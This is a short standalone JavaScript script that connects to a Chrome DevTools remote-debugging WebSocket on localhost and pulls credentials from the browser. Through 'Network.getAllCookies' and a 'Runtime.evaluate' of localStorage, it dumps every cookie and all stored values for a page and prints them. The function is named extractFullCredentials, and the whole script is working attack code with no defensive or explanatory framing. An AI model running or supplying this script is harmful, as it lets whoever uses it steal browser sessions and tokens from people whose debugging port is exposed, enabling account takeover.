var WebSocketClient = globalThis.WebSocket;

async function extractFullCredentials() {
  var ws = new WebSocketClient('ws://127.0.0.1:9445/devtools/page/5CF8C597D66497349E2DF9ED17D77C43');
  var creds = { cookies: [], localStorage: {} };

  ws.onopen = function() {
    ws.send(JSON.stringify({ id: 1, method: 'Network.getAllCookies' }));
    ws.send(JSON.stringify({
      id: 2,
      method: 'Runtime.evaluate',
      params: { expression: 'JSON.stringify(Object.assign({}, localStorage))', returnByValue: true }
    }));
  };

  ws.onmessage = function(event) {
    var msg = JSON.parse(event.data);
    if (msg.id === 1 && msg.result && msg.result.cookies) {
      creds.cookies = msg.result.cookies;
    }
    if (msg.id === 2 && msg.result && msg.result.result) {
      try {
        creds.localStorage = JSON.parse(msg.result.result.value);
      } catch (_) {}
      console.log(JSON.stringify(creds, null, 2));
      ws.close();
      process.exit(0);
    }
  };
}

extractFullCredentials();
